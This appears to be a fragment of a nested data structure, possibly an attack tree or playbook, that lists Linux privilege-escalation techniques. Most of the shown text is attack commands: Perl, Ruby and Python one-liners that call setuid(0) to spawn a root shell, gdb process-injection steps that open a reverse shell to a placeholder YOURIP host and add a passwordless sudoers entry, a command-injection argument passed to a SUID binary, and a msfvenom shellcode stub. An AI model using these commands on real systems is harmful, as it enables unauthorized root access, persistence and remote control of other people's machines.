                    ...
                    'children': [
                        {
                            ...
                            'metadata': {
                                ...
                                'alternatives': [
                                    'Perl: perl -e \'use POSIX; POSIX::setuid(0); system("/bin/bash")\'',
                                    'Ruby: ruby -e \'Process::Sys.setuid(0); system("/bin/bash")\'',
                                    'Execute via binary: echo "import os; os.setuid(0); os.system(\'/bin/bash\')" > /tmp/root.py && python /tmp/root.py'
                                ],
                    ...
                    'children': [
                        {
                            ...
                            'metadata': {
                                ...
                                'notes': [
                                    ...
                                    '',
                                    'Method 2: Enumerate root\'s files',
                                    'import os',
                    ...
                    'children': [
                        {
                            ...
                            'metadata': {
                                ...
                                'notes': """
                                    ...
                                    'shellcode = b"\\x48\\x31\\xc0\\x48\\x31\\xd2..." # msfvenom payload',
                                    '',
                                    ...
                                    'gdb -p <PID>',
                                    '(gdb) call (void)system("bash -c \\'bash -i >& /dev/tcp/YOURIP/4444 0>&1\\'")',
                                    '(gdb) detach',
                                    '(gdb) quit'
                                """,
                                'alternatives': [
                        ...
                        },
                        {
                            ...
                            'metadata': {
                                ...
                                'notes': [
                                    ...
                                    '(gdb) call (void)system("echo \\'youruser ALL=(ALL) NOPASSWD:ALL\\' >> /etc/sudoers")',
                                    '(gdb) call (void)system("bash -c \\'bash -i >& /dev/tcp/YOURIP/4444 0>&1\\'")',
                                    '',
                                    'Step 4: Detach',
                                    '(gdb) detach',
                ...
                },
                {
                    ...
                    'metadata': {
                        ...
                        'notes': [
                            ...
                            './suid_binary "x; bash -c \\'bash -i >& /dev/tcp/YOURIP/4444 0>&1\\'"',
                            '',
                            'Create SUID bash:',
